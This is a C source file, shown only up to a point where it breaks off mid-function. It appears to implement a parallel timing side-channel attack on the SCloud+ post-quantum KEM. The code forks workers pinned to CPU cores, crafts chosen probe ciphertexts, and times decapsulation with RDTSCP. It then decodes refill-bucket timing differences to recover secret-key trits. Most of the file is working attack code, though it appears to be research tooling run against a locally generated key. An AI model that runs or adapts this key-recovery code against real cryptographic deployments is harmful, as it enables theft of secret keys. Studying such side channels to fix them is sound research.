/* PARALLEL end-to-end physical recovery (fork + shared memory).
 *
 * Recovery model (one probe, in matrix notation):
 *   c1[0][k] = a, all other c1 entries = 0; c2[0] = v, all other rows = 0.
 *   Therefore (c1*S)[0][j] = a*S[k][j], so k selects a secret row and j
 *   selects an output column.  The decapsulation value at that column is
 *   v[j] - a*S[k][j].  For the three candidates S[k][j] = -1,0,+1 the
 *   predicted values are v[j]+a, v[j], v[j]-a.  The code measures bucket
 *   signatures for a base probe v and a joint-shifted probe vs and maps the
 *   pair of refill buckets to the trit; it does not use different a values to
 *   mean the three trits.  The ground-truth index is therefore S[k][i], where
 *   k is the c1 position and i is the c2/output coordinate.
 *
 * Same attack as recover_e2e.c, parallelised across physical cores:
 *   - OFFLINE pk-only probe search uses a shared coordinate queue across
 *     workers. PARENT finds known-bucket references after search completes.
 *   - fork() W workers; each inherits the probe table + sk + references via COW
 *     (read-only for workers, no IPC needed). Each worker pins itself to one
 *     physical core, RE-CALIBRATES gap/threshold on that core (so the threshold
 *     reflects the loaded, parallel condition), then processes its slice of the
 *     (coord,position) work list, timing scloud_kemdecaps and classifying buckets.
 *   - Per-coefficient results go to a shared mmap array; PARENT aggregates.
 *
 * LEVEL-PORTABLE (2026-10-07): every per-level constant is derived from the
 * level's parameters.h, mirroring what scloud_attack_wide.c already proved for
 * the oracle attack at the wide levels (384/512):
 *   - refill bucket = generated_bytes / SAMPLE_BLOCK_BYTES (544 at BD-6/12
 *     levels i.e. 256/384/512, 672 at BD-2/4 levels i.e. 128/192);
 *   - the reference buckets are AUTO-DETECTED per key (modal adjacent pair,
 *     found by a deterministic pk-only scan) instead of the hardcoded 53/54
 *     of the level-256 runs;
 *   - the probe v sits on the decode rounding grid 2^(logq - msg_scale_bits)
 *     (64 at levels 256/512, 128 at 128/192/384), and the amplitude menu
 *     extends to 32 where the grid cell doubles, keeping the boundary-crossing
 *     odds of the level-256 search.
 *
 * This box: i7-9700, 8 physical cores, NO SMT. Cores used default to
 * {1,2,4,5,7,6} -- core0 (system/IRQ) and core3 (polarlac timing_attack_light)
 * are avoided. Measured: 5-core load raises core6 MAD only ~26% (5.0->6.3 us),
 * so parallel is safe here (independent cores, turbo off locks frequency).
 *
 * Args: [key_seed] [positions_per_coord] [N_shots] [N_cal] [max_tries] [coords]
 *       [nworkers] [clock]
 *   clock: 0=MONOTONIC (default here) 1=MONOTONIC_RAW
 *
 * Env knobs (measurement rigour, do NOT touch the decaps itself):
 *   BATCH_WORKERS=B  run nworkers in waves of <=B concurrently-pinned cores.
 *                    Same round-robin work slice; only wall-clock concurrency
 *                    drops. Each wave re-calibrates. "6 in two waves of 3" =
 *                    BATCH_WORKERS=3 nworkers=6. Default: one wave (=nworkers).
 *   SERIAL_CAL=1     within a wave, calibrate one core at a time then barrier
 *                    before timing (unloaded gap). Default 0 = legacy loaded.
 *   SEARCH_ONLY=1    stop after offline probe search; exit 2 if incomplete.
 *   PROBE_CACHE=<path>  load/save the offline probe table so a repeat run with
 *                    the same key skips the search.
 *   Probe acceptance ALWAYS exhausts all ternary vectors using public decode.
 *   PROBE_VALIDATE=1 is rejected: secret-aided probe selection is disabled.
 *   ORACLE=1         derive the guess from real refill buckets, not timing, to
 *                    isolate probe-logic errors from measurement noise.
 *   TIMING_INTERLEAVE=1 alternate base/shift shots, randomizing which goes
 *                    first per shot. Default 0 preserves blocked acquisition.
 *   JOINT_DECODE=1   classify the continuous two-axis timing jointly (L1).
 *                    Default 0 preserves independent bucket quantization.
 *   PROFILE_ONLY=1   export public candidate/reference sampler bucket and
 *                    rejection-batch counts, then stop before timing.
 */
#define _GNU_SOURCE
#define main recover_demo_unused_main
#include "../../recover_demo.c"
#undef main
#include <time.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <limits.h>
#include <errno.h>
#include <fcntl.h>
#include <x86intrin.h>

/* Shared futexes: waiters sleep, leaving serial calibration cores idle.
 * Recheck after EAGAIN, EINTR or a spurious wake; never use FUTEX_PRIVATE
 * because these words synchronize separate forked processes. */
static void wait_until(int *word, int target){
    int seen;
    while((seen=__atomic_load_n(word,__ATOMIC_ACQUIRE))!=target){
        if(syscall(SYS_futex,word,FUTEX_WAIT,seen,NULL,NULL,0)<0 &&
           errno!=EAGAIN && errno!=EINTR){perror("futex wait");_exit(4);}
    }
}
static void advance(int *word){
    __atomic_fetch_add(word,1,__ATOMIC_ACQ_REL);
    /* Wake all: the kernel may otherwise wake a worker whose turn is later. */
    if(syscall(SYS_futex,word,FUTEX_WAKE,INT_MAX,NULL,NULL,0)<0){
        perror("futex wake");_exit(4);
    }
}

/* ----------------------- level-portable probe grid ----------------------- *
 * msg_decode rounds to multiples of 2^(logq - msg_scale_bits): 64 at levels
 * 256/512, 128 at 128/192/384 (see common/encode.c bddbwn scale_bits).  The
 * probe v sits ON this grid, so single-coordinate +-a perturbations probe the
 * BDD cell faces; where the cell doubles, the amplitude menu doubles too. */
#define DECODE_GRID (1u << (scloudplus_logq - scloudplus_msg_scale_bits))
/* Probe amplitude range: every integer 1..AMP_MAX (not just powers of two), with
 * joint shift drawn uniformly in +-1..+-a.  The old power-of-two menu {1,2,...,32}
 * with shift +-1 only was removed: it could not reach valid probes such as 384
 * coord 9 (a=9, delta=+3), so it is no longer a correct search space. */
#define AMP_MAX (DECODE_GRID / 4u)

/* 512 requires every candidate pair to differ by >=2 on at least one axis. */
#define MIN_CLASS_GAP (scloudplus_n == 2400 ? 2u : 1u)
static size_t bucket_distance(size_t a, size_t b){return a>b?a-b:b-a;}

/* ----- offline pk-only prediction & search (same as recover_e2e.c) ----- */
/* Candidate-local memo: exact message comparisons, no stale-key state or
 * unbounded table. All six base/shift predictions share one public-key hash. */
typedef struct {
    uint8_t mu[6][scloudplus_ss];
    size_t bucket[6];
    unsigned count;
} search_messages_t;
static void search_decode(const uint16_t *v, unsigned i, unsigned a,
                          uint8_t mu[3][scloudplus_ss])
{
    uint16_t d[(size_t)scloudplus_mbar*scloudplus_nbar]={0};
    memcpy(d,v,sizeof(*v)*scloudplus_nbar);
    for(int s=-1;s<=1;s++){
        d[i]=(uint16_t)((int)v[i]-(int)a*s)&scloudplus_q_mask;
        msg_decode(d,mu[s+1]);
    }
}
static size_t search_bucket(const uint8_t *hash, search_messages_t *cache,
                            const uint8_t *mu)
{
    for(unsigned j=0;j<cache->count;j++)
        if(!memcmp(cache->mu[j],mu,scloudplus_ss)) return cache->bucket[j];
    size_t b,r;
    profile_message_hashed(hash,mu,&b,&r);
    unsigned j=cache->count++;
    memcpy(cache->mu[j],mu,scloudplus_ss); cache->bucket[j]=b;
    return b;
}
static int robust_ok(const uint16_t *v, unsigned i, unsigned a)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    uint8_t m0[scloudplus_ss], mt[scloudplus_ss];
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    msg_decode(d, m0);
    for (unsigned j = 0; j < scloudplus_nbar; j++) {
        if (j == i) continue;
        for (int t = -1; t <= 1; t += 2) {
            uint16_t d2[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
            memcpy(d2, v, sizeof(uint16_t) * scloudplus_nbar);
            d2[j] = (uint16_t)((int)v[j] - (int)a * t) & scloudplus_q_mask;
            msg_decode(d2, mt);
            if (memcmp(m0, mt, scloudplus_ss) != 0) return 0;
        }
    }
    return 1;
}

typedef struct {
    unsigned a; int delta; uint16_t v[scloudplus_nbar];
    size_t pb0[3], pb1[3];
    unsigned tries; int found;
    unsigned char cls;   /* 0=joint (needs base+shift), 1=base isolates 0
                          * (lazy shift), 2=base trisects (base-only) */
    unsigned misses;     /* reserved legacy field; never a proof of validity */
} probe_t;

#include "../../probe_validation.h"

/* Cache v2 binds public-key identity, parameters and complete probe payload.
 * Even an intact v2 cache is re-proved before timing; old caches fail closed. */
typedef struct {
    uint8_t magic[8];
    uint32_t version,n,nbar,ncoord,proof_version,record_size;
    uint8_t pk_hash[scloudplus_hash_bytes];
    uint8_t probe_hash[scloudplus_hash_bytes];
} probe_cache_header_t;

static void make_probe_header(probe_cache_header_t *hd,const uint8_t *pk,
                              unsigned nc,const probe_t *pr){
    memset(hd,0,sizeof(*hd));memcpy(hd->magic,"SCPPRB02",8);
    hd->version=2;hd->n=scloudplus_n;hd->nbar=scloudplus_nbar;hd->ncoord=nc;
    hd->proof_version=PROBE_VALIDATION_VERSION;hd->record_size=sizeof(probe_t);
    scloudplus_H(hd->pk_hash,pk,scloudplus_pk);
    scloudplus_H(hd->probe_hash,(const uint8_t *)pr,sizeof(probe_t)*scloudplus_nbar);
}

static probe_t search_probe(const uint8_t *pke_pk, unsigned i, unsigned max_tries)
{
    uint8_t pk_hash[scloudplus_hash_bytes];
    scloudplus_H(pk_hash,pke_pk,scloudplus_pk);
    for (unsigned t = 1; t <= max_tries; t++) {
        unsigned a = 1u + xr() % AMP_MAX;
        int delta = ((int)(xr() % 2) ? +1 : -1);
        delta *= (int)(1u + xr() % a);
        uint16_t v[scloudplus_nbar], vs[scloudplus_nbar];
        for (unsigned j = 0; j < scloudplus_nbar; j++)
            v[j] = (uint16_t)(((xr() % (scloudplus_q / DECODE_GRID)) * DECODE_GRID)
                              & scloudplus_q_mask);
        memcpy(vs, v, sizeof(vs));
        vs[i] = (uint16_t)((vs[i] + delta + scloudplus_q) & scloudplus_q_mask);
        uint8_t mu0[3][scloudplus_ss],mu1[3][scloudplus_ss];
        search_decode(v,i,a,mu0); search_decode(vs,i,a,mu1);
        int collision=0;
        for(unsigned x=0;x<3;x++) for(unsigned y=x+1;y<3;y++)
            if(!memcmp(mu0[x],mu0[y],scloudplus_ss) &&
               !memcmp(mu1[x],mu1[y],scloudplus_ss)) collision=1;
        if(collision) continue;
        if (!robust_ok(v, i, a) || !robust_ok(vs, i, a)) continue;
        search_messages_t cache={0};
        size_t b0[3], b1[3];
        for (int s = -1; s <= 0; s++) {
            b0[s+1] = search_bucket(pk_hash,&cache,mu0[s+1]);
            b1[s+1] = search_bucket(pk_hash,&cache,mu1[s+1]);
        }
        int d01 = (bucket_distance(b0[0],b0[1])>=MIN_CLASS_GAP) || (bucket_distance(b1[0],b1[1])>=MIN_CLASS_GAP);
        /* If -1 and 0 collide on BOTH axes, +1 cannot rescue this probe.
         * Skip two profiles without consuming RNG or changing the choice. */
        if (!d01) continue;
        b0[2] = search_bucket(pk_hash,&cache,mu0[2]);
        b1[2] = search_bucket(pk_hash,&cache,mu1[2]);
        int d02 = (bucket_distance(b0[0],b0[2])>=MIN_CLASS_GAP) || (bucket_distance(b1[0],b1[2])>=MIN_CLASS_GAP);
        int d12 = (bucket_distance(b0[1],b0[2])>=MIN_CLASS_GAP) || (bucket_distance(b1[1],b1[2])>=MIN_CLASS_GAP);
        if (!(d01 && d02 && d12)) continue;  /* correctness floor: fully separable */
        /* index map: b0[0]=s(-1), b0[1]=s(0), b0[2]=s(+1) */
        int base_tri  = (b0[0]!=b0[1]) && (b0[0]!=b0[2]) && (b0[1]!=b0[2]);
        int base_iso0 = (b0[1]!=b0[0]) && (b0[1]!=b0[2]);
        unsigned char cls = base_tri ? 2 : (base_iso0 ? 1 : 0);
        probe_t cand; memset(&cand, 0, sizeof(cand));
        cand.a=a; cand.delta=delta; cand.tries=t; cand.found=1; cand.cls=cls;
        memcpy(cand.v, v, sizeof(v));
        memcpy(cand.pb0, b0, sizeof(b0)); memcpy(cand.pb1, b1, sizeof(b1));
        /* Cheap filters only reject. Only a complete public proof accepts. */
        if (!probe_messages_invariant(&cand,i)) continue;
        fprintf(stderr,"PROBE_PROOF coord=%u cases=%llu axes=2 status=passed\n",
                i,(unsigned long long)probe_public_cases());
        return cand;                           /* first fully-separable probe */
    }
    probe_t p; memset(&p, 0, sizeof(p)); p.tries = max_tries; p.found = 0; return p;
}

/* ORACLE=1: PERFECT-oracle debug mode. Derive the guess from the real refill
 * buckets (real_bucket, secret-aided) instead of the timed medians, so there is
 * ZERO measurement noise. Isolates code/probe-logic errors from physical
 * measurement: if a coord still mis-recovers under ORACLE, its probe's
 * prediction table cannot separate the trit (not a timing problem). N can be 1.
 * Never a real attack -- uses the secret key for the bucket read. */
static int g_oracle = 0;

/* ----------------------- physical timing ----------------------- */
static clockid_t CLK = CLOCK_MONOTONIC;
static uint64_t mono_ns(void){ struct timespec t; clock_gettime(CLK,&t);
    return (uint64_t)t.tv_sec*1000000000ULL + (uint64_t)t.tv_nsec; }
static int use_tsc=1; /* Default: fenced RDTSCP; TIMING_TSC=0 selects clock_gettime. */
static double tsc_ns=1.0;
static uint64_t read_tsc(void){
    unsigned aux;
    _mm_lfence();
    uint64_t t=__rdtscp(&aux);
    _mm_lfence();
    return t;
}
static void init_tsc(void){
    struct timespec pause={0,50000000};
    uint64_t n0=mono_ns(),t0=read_tsc();
    nanosleep(&pause,NULL);
    uint64_t t1=read_tsc(),n1=mono_ns();
    tsc_ns=(double)(n1-n0)/(double)(t1-t0);
    fprintf(stderr,"TSC ns_per_tick=%.9f\n",tsc_ns);
}
static unsigned long long sprt_calls=0;
static volatile uint8_t sink;
static double time_decaps(const uint8_t*sk,const uint8_t*ct){ uint8_t ss[scloudplus_ss];
    sprt_calls++; uint64_t a=use_tsc?read_tsc():mono_ns(); scloud_kemdecaps(sk,ct,ss); uint64_t b=use_tsc?read_tsc():mono_ns();
    sink^=ss[0]; return (double)(b-a)*(use_tsc?tsc_ns:1.0); }
/* One sample is a symmetric quartet, randomized between ABBA and BAAB.
 * Averaging the two opposing differences cancels additive linear drift over
 * call index; it does not remove preemption, nonlinear drift or CT effects.
 * TIMING_ABBA=1 enables this experimental estimator; default 0 retains
 * the old two-call estimator until physical stability is demonstrated.
 * Units remain ns per decapsulation, but each shot now costs four calls. */
static int timing_abba=0;
static double time_difference(const uint8_t *sk,const uint8_t *probe,
                              const uint8_t *ref){
    int forward=(xr()&1)!=0;
    const uint8_t *a=forward?probe:ref, *b=forward?ref:probe;
    double t0=time_decaps(sk,a);
    double t1=time_decaps(sk,b);
    double d=t0-t1;
    if(timing_abba){
        double t2=time_decaps(sk,b);
        double t3=time_decaps(sk,a);
        d=0.5*(d+t3-t2);
    }
    return forward?d:-d;
}
static int cmpd(const void*a,const void*b){ double x=*(const double*)a,y=*(const double*)b; return (x>y)-(x<y);}
static double med(double*x,unsigned n){ qsort(x,n,sizeof(double),cmpd);
    return n&1?x[n/2]:0.5*(x[n/2-1]+x[n/2]); }

/* Preserve acquisition order until the split-half drift diagnostic is taken.
 * MAD is sample dispersion, NOT a standard error or correctness probability.
 * The scratch buffer is worker-local and allocated once, outside timing. */
static double summarize_samples(double *x, unsigned n, double *scratch,
                                double *mad, double *half_delta){
    unsigned half=n/2;
    if(half){
        memcpy(scratch,x,sizeof(*x)*n);
        double early=med(scratch,half);
        double late=med(scratch+half,n-half);
        *half_delta=late-early;
    } else *half_delta=NAN;
    double middle=med(x,n);
    for(unsigned j=0;j<n;j++) scratch[j]=fabs(x[j]-middle);
    *mad=med(scratch,n);
    return middle;
}

static void measure_axes(const uint8_t *sk,const uint8_t *base,
                         const uint8_t *shift,const uint8_t *ref,
                         double *db,double *ds,unsigned n,int interleave){
    if(interleave){
        for(unsigned t=0;t<n;t++){
            if(xr()&1){
                db[t]=time_difference(sk,base,ref);
                ds[t]=time_difference(sk,shift,ref);
            } else {
                ds[t]=time_difference(sk,shift,ref);
                db[t]=time_difference(sk,base,ref);
            }
        }
    } else {
        for(unsigned t=0;t<n;t++) db[t]=time_difference(sk,base,ref);
        for(unsigned t=0;t<n;t++) ds[t]=time_difference(sk,shift,ref);
    }
}

static void build_probe_ct(const uint16_t *v, unsigned k, unsigned a, uint8_t *ct){
    uint16_t c1[(size_t)scloudplus_mbar*scloudplus_n]={0};
    uint16_t c2[(size_t)scloudplus_mbar*scloudplus_nbar]={0};
    c1[k]=(uint16_t)a; memcpy(c2,v,sizeof(v[0])*scloudplus_nbar);
    pack_c1(c1,ct); pack_c2(c2,ct+scloudplus_c1);
}
static void build_ref_ct(const uint8_t*m,uint8_t*ct){
    uint16_t c1[(size_t)scloudplus_mbar*scloudplus_n]={0};
    uint16_t c2[(size_t)scloudplus_mbar*scloudplus_nbar];
    msg_encode(m,c2); pack_c1(c1,ct); pack_c2(c2,ct+scloudplus_c1);
}
static size_t real_bucket(const uint8_t*sk,const uint16_t*v,unsigned k,unsigned a){
    uint8_t ct[scloudplus_ctx],ss[scloudplus_ss];
    build_probe_ct(v,k,a,ct);
    generated_bytes=0; if(scloud_kemdecaps(sk,ct,ss)!=0) _exit(3);
    return generated_bytes/BUCKET_BYTES;
}

/* Reference buckets establish a per-bucket timing scale. Classification uses
 * each probe's candidate table, which may extend outside this reference pair. */
static int B_LO = -1, B_HI = -1;

/* Shared L1 decoder: bucket units offline, nanoseconds physically.
 * Exact ties retain candidate order -1,0,+1 for reproducible replay. */
static int pair_decode(const size_t a[3], const size_t b[3],
                       double x, double y, double origin, double gap){
    if(!isfinite(gap) || gap<=0 || !isfinite(x) || !isfinite(y)) return 99;
    double best=INFINITY; int guess=99;
    for(int j=0;j<3;j++){
        double d=fabs(x-((double)a[j]-origin)*gap)
                +fabs(y-((double)b[j]-origin)*gap);
        if(d<best){best=d;guess=j-1;}
    }
    return guess;
}

/* Filtering depends only on reference timing, never the secret or guess. */
static int reference_valid(double observed,double gap){
    return isfinite(gap) && gap>0 && isfinite(observed) && observed>0
           && observed>=gap/2 && observed<=gap*2;
}

static int calibration_valid(const double rounds[3]){
    double lo=fmin(rounds[0],fmin(rounds[1],rounds[2]));
    double hi=fmax(rounds[0],fmax(rounds[1],rounds[2]));
    return isfinite(rounds[0]) && isfinite(rounds[1]) &&
           isfinite(rounds[2]) && lo>0 && hi<=2*lo;
}

/* Bounded retries; positivity and factor-two agreement are sanity checks,
 * not a statistical guarantee of accurate calibration. Log every attempt. */
static double calibrate(const uint8_t *sk,const uint8_t *lo,
                        const uint8_t *hi,unsigned n,unsigned worker){
    unsigned per=n/3;
    double *samples=malloc(sizeof(double)*per);
    if(!samples) return NAN;
    for(unsigned attempt=0;attempt<3;attempt++){
        double rounds[3];
        for(unsigned r=0;r<3;r++){
            for(unsigned j=0;j<per;j++){
                samples[j]=time_difference(sk,hi,lo);
            }
            rounds[r]=med(samples,per);
        }
        int ok=calibration_valid(rounds);
        fprintf(stderr,"CAL worker=%u attempt=%u per_round=%u medians_ns=%.17g,%.17g,%.17g status=%s\n",
                worker,attempt+1,per,rounds[0],rounds[1],rounds[2],ok?"ok":"retry");
        if(ok){double gap=med(rounds,3);free(samples);return gap;}
    }
    free(samples);
    fprintf(stderr,"CAL worker=%u status=failed; no predictions\n",worker);
    return NAN;
}


#include "sprt.h"
static double sequential_alpha=.01;
static unsigned sequential_min=32,sequential_batch=16;
static int sequential_axis(const size_t *b,size_t *lo,size_t *hi){
    *lo=*hi=b[0];
    for(int j=1;j<3;j++){if(b[j]<*lo)*lo=b[j];if(b[j]>*hi)*hi=b[j];}
    for(int j=0;j<3;j++)if(b[j]!=*lo && b[j]!=*hi)return 0;
    return 1;
}
static void sequential_measure(const uint8_t *sk,const uint8_t *a,const uint8_t *b,
                              const uint8_t *ref,const probe_t *p,double gap,unsigned cap,
                              double *da,double *db,sprt_state state[2],int buckets[2],
                              FILE *raw,unsigned coord,unsigned pos){
    const uint8_t *ct[2]={a,b};double *samples[2]={da,db};
    const size_t *table[2]={p->pb0,p->pb1};
    size_t lo[2],hi[2];double boundary[2];
    for(int axis=0;axis<2;axis++){
        sprt_init(&state[axis]);buckets[axis]=-1;
        if(!sequential_axis(table[axis],&lo[axis],&hi[axis]))_exit(7);
        boundary[axis]=(.5*(lo[axis]+hi[axis])-B_LO)*gap;
        if(lo[axis]==hi[axis])buckets[axis]=(int)lo[axis];
    }
    for(unsigned base=0;base<cap;base+=sequential_batch){
        unsigned stop=base+sequential_batch;if(stop>cap)stop=cap;
        for(unsigned j=base;j<stop;j++){
            unsigned first=xr()&1;
            for(unsigned t=0;t<2;t++){
                unsigned axis=(first+t)%2;
                if(buckets[axis]>=0)continue;
                double x=time_difference(sk,ct[axis],ref);
                samples[axis][state[axis].n]=x;
                sprt_add(&state[axis],x,boundary[axis]);
                fprintf(raw,"%u,%u,%u,%u,%.17g\n",coord,pos,axis,state[axis].n,x);
            }
        }
        for(int axis=0;axis<2;axis++)if(buckets[axis]<0){
            int side=sprt_decide(&state[axis],sequential_alpha,sequential_min);
            if(side>=0)buckets[axis]=(int)(side?hi[axis]:lo[axis]);
        }
        if(buckets[0]>=0 && buckets[1]>=0)break;
    }
}
/* work item + shared result slot */
typedef struct { unsigned coord, pos; } item_t;
typedef struct {
    int true_v, guess;
    double ma, mb, ref_median;
    double mad_a, mad_b, half_delta_a, half_delta_b;
    unsigned ref_shots;
    unsigned char tb, ts, nb, ns;  /* timed/noiseless buckets (base,shift) */
    unsigned na,nbshots; int ref_ok; double local_ref,own_gap,loge_a,loge_b;
    unsigned char done;
} res_t;

static int pin_core(int core){
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(core,&set);
    return sched_setaffinity(0,sizeof(set),&set);
}

int collector_unused_main(int argc,char**argv){

    if(getenv("SPRT_ALPHA"))sequential_alpha=strtod(getenv("SPRT_ALPHA"),NULL);
    if(!(sequential_alpha>0 && sequential_alpha<1) || !getenv("SPRT_OUT"))return 2;
    if(getenv("ORACLE") && atoi(getenv("ORACLE")))return 2;
    if(argc>1) krng=strtoull(argv[1],0,10)|1ULL;
    const unsigned per_coord=argc>2?(unsigned)strtoul(argv[2],0,10):16U;
    const unsigned N        =argc>3?(unsigned)strtoul(argv[3],0,10):160U;
    const unsigned Ncal     =argc>4?(unsigned)strtoul(argv[4],0,10):3000U;
    const unsigned max_tries=argc>5?(unsigned)strtoul(argv[5],0,10):300000U;
    const unsigned ncoord   =argc>6?(unsigned)strtoul(argv[6],0,10):scloudplus_nbar;
    unsigned nworkers       =argc>7?(unsigned)strtoul(argv[7],0,10):6U;
    if(argc>8 && strtoul(argv[8],0,10)==1) CLK=CLOCK_MONOTONIC_RAW;
    if(!per_coord || !N || Ncal<3 || !max_tries ||
       !ncoord || ncoord>scloudplus_nbar){
        fprintf(stderr,"require positions>0, shots>0, Ncal>=3, tries>0, coords=1..%u\n",
                (unsigned)scloudplus_nbar);
        return 2;
    }

    /* cores to use: avoid 0 (system) and 3 (polarlac). order puts the under-test
     * core 6 last so single-worker runs land on the characterised core. */
    const char *tsc_env=getenv("TIMING_TSC");
    if(tsc_env){
        if(strcmp(tsc_env,"0") && strcmp(tsc_env,"1")){
            fprintf(stderr,"TIMING_TSC must be 0 or 1\n");return 2;
        }
        use_tsc=strcmp(tsc_env,"0")!=0;
    }
    fprintf(stderr,"TIMER backend=%s\n",use_tsc?"RDTSCP+LFENCE":"clock_gettime");
    if(use_tsc) init_tsc();
    const char *timing_env=getenv("TIMING_ABBA");
    if(timing_env){
        if(strcmp(timing_env,"0") && strcmp(timing_env,"1")){
            fprintf(stderr,"TIMING_ABBA must be 0 or 1\n");return 2;
        }
        timing_abba=strcmp(timing_env,"0")!=0;
    }
    fprintf(stderr,"TIMING estimator=%s calls_per_shot=%u units=ns/decapsulation\n",
            timing_abba?"symmetric-abba":"random-pair",timing_abba?4:2);
    int interleave=getenv("TIMING_INTERLEAVE") && atoi(getenv("TIMING_INTERLEAVE"));
    int joint_decode=getenv("JOINT_DECODE") && atoi(getenv("JOINT_DECODE"));
    fprintf(stderr,"TIMING axes=%s decoder=%s\n",interleave?"interleaved":"blocked",
            joint_decode?"joint-l1":"independent-buckets");
    static const int CORES[] = {1,2,4,5,7,6};
    const unsigned NCORES = sizeof(CORES)/sizeof(CORES[0]);
    if(nworkers>NCORES) nworkers=NCORES;
    if(nworkers<1) nworkers=1;
    unsigned BW=nworkers;
    { const char *e=getenv("BATCH_WORKERS");
      if(e){long b=strtol(e,0,10);if(b>0 && (unsigned)b<BW) BW=(unsigned)b;} }
    int serial_cal=getenv("SERIAL_CAL") && atoi(getenv("SERIAL_CAL"));


    fprintf(stderr,"probe search amplitudes=1..%u joint shift=+-1..a\n",AMP_MAX);
    { const char*e=getenv("ORACLE"); if(e&&atoi(e)) g_oracle=1; }
    if ((getenv("PROBE_VALIDATE") && strcmp(getenv("PROBE_VALIDATE"),"0")) ||
        getenv("PROBE_VALIDATE_TOL")){
        fprintf(stderr,"Secret-aided PROBE_VALIDATE is disabled; public exhaustive proof is mandatory\n");
        return 2;
    }
    if(!probe_public_cases()){
        fprintf(stderr,"Public proof exceeds supported enumeration limit; refusing unverified probes\n");
        return 2;
    }

    uint8_t pk[scloudplus_pk],sk[scloudplus_kem_sk];
    if(scloud_kemkeygen(pk,sk))return 1;
    /* Export the actual public key used by this capture, never the secret. */
    const char *public_key_out=getenv("PUBLIC_KEY_OUT");
    if(public_key_out && *public_key_out){
        FILE *pf=fopen(public_key_out,"wb");
        if(!pf){perror("PUBLIC_KEY_OUT");return 2;}
        int ok=fwrite(pk,1,sizeof(pk),pf)==sizeof(pk);
        if(fclose(pf))ok=0;
        if(!ok){fprintf(stderr,"PUBLIC_KEY_OUT write failed\n");return 2;}
    }

    const uint8_t*pke_pk=sk+scloudplus_pke_sk;
    /* Truth and exact bucket diagnostics are excluded from this collector. */
    memo=calloc(MEMO_SLOTS,sizeof(*memo)); if(!memo)return 1;

    fprintf(stderr,"clock=%s workers=%u cores=",
            CLK==CLOCK_MONOTONIC_RAW?"RAW":"MONOTONIC",nworkers);
    for(unsigned w=0;w<nworkers;w++) fprintf(stderr,"%d%s",CORES[w],w+1<nworkers?",":"\n");

    /* ---- OFFLINE pk-only probe search, PARALLELISED across workers ----
     * pr[] lives in shared memory; fork W workers, each pins a core and
     * claims the next coord from a shared queue, writing results back.
     * Seed by the OLD round-robin owner so scheduling never changes probes.
     * parent wait() is the barrier before the physical phase. */
    probe_t*pr=mmap(NULL,sizeof(probe_t)*scloudplus_nbar,PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(pr==MAP_FAILED){perror("mmap pr");return 3;}
    memset(pr,0,sizeof(probe_t)*scloudplus_nbar);
    unsigned *next_coord=mmap(NULL,sizeof(*next_coord),PROT_READ|PROT_WRITE,
                              MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(next_coord==MAP_FAILED){perror("mmap search queue");return 3;}
    *next_coord=0;
    uint64_t ot0=mono_ns();
    /* Existing cache files are immutable inputs: reject, never silently replace. */
    char cache_path[512]={0}; int cache_loaded=0;
    { const char*e=getenv("PROBE_CACHE");
      if(e&&*e){
        if(strlen(e)>=sizeof(cache_path)){
          fprintf(stderr,"PROBE_CACHE path too long\n");return 2;
        }
        snprintf(cache_path,sizeof(cache_path),"%s",e);
        FILE*cf=fopen(cache_path,"rb");
        if(cf){
          probe_cache_header_t hd,want;
          int loaded=fread(&hd,sizeof(hd),1,cf)==1 &&
                     fread(pr,sizeof(probe_t),scloudplus_nbar,cf)==scloudplus_nbar &&
                     fgetc(cf)==EOF && !ferror(cf);
          fclose(cf);
          make_probe_header(&want,pke_pk,ncoord,pr);
          if(!loaded || memcmp(&hd,&want,sizeof(hd))){
            fprintf(stderr,"PROBE_CACHE rejected: legacy, mismatched or damaged file %s; "
                           "use a new path for a new public-only search\n",cache_path);
            return 2;
          }
          for(unsigned i=0;i<ncoord;i++){
            unsigned long long cases=(unsigned long long)probe_public_cases();
            if(cases>PROBE_SAMPLE_THRESHOLD)
              fprintf(stderr,"PROBE_PROOF cache coord=%u pk-bucket match over %llu space "
                      "(public bucket binding only, not exhaustive invariance)\n",i,cases);
            else
              fprintf(stderr,"PROBE_PROOF cache coord=%u checking all %llu vectors\n",i,cases);
            if(!probe_public_valid(want.pk_hash,&pr[i],i)){
              fprintf(stderr,"PROBE_CACHE rejected: public proof failed at coord %u\n",i);
              return 2;
            }
          }
          cache_loaded=1;
          fprintf(stderr,"probe cache LOADED and publicly revalidated from %s\n",cache_path);
        } else if(errno!=ENOENT){perror("PROBE_CACHE");return 2;}
      }
    }
    for(unsigned w=0;w<nworkers && !cache_loaded;w++){
        pid_t pid=fork();
        if(pid<0){perror("fork");return 4;}
        if(pid==0){
            pin_core(CORES[w]);
            /* per-coord retry: the probe search is randomised, so a single
             * RNG stream can miss within max_tries. Reseed and retry a few
             * rounds so every coord is found with near certainty. */
            for(;;){
                unsigned i=__atomic_fetch_add(next_coord,1,__ATOMIC_RELAXED);
                if(i>=ncoord) break;
                unsigned seed_owner=i%nworkers;
                probe_t best; memset(&best,0,sizeof(best)); best.found=0;
                for(unsigned att=0; att<4 && !best.found; att++){
                    rng = 0x2545f4914f6cdd1dULL
                        ^ (0x9e3779b97f4a7c15ULL*(uint64_t)(seed_owner+1))
                        ^ (0xbf58476d1ce4e5b9ULL*(uint64_t)(att+1)*(uint64_t)(i+1));
                    best = search_probe(pke_pk,i,max_tries);
                }
                pr[i]=best;
            }
            _exit(0);
        }
    }
    if(!cache_loaded) for(unsigned w=0;w<nworkers;w++){
        int status;
        if(wait(&status)<0 || !WIFEXITED(status) || WEXITSTATUS(status)){
            fprintf(stderr,"Probe search worker failed; refusing partial results\n");return 2;
        }
    }
    munmap(next_coord,sizeof(*next_coord));
    /* Did EVERY coordinate get a usable probe?  The cache is a finished-product
     * artifact, so we only save (and only recover) when all ncoord columns are
     * covered. */
    int all_found=1;
    for(unsigned i=0;i<ncoord;i++)
        if(!pr[i].found){ all_found=0; }
    if(!cache_loaded && cache_path[0] && all_found){
        probe_cache_header_t hd;make_probe_header(&hd,pke_pk,ncoord,pr);
        /* Exclusive creation prevents concurrent runs from replacing a cache. */
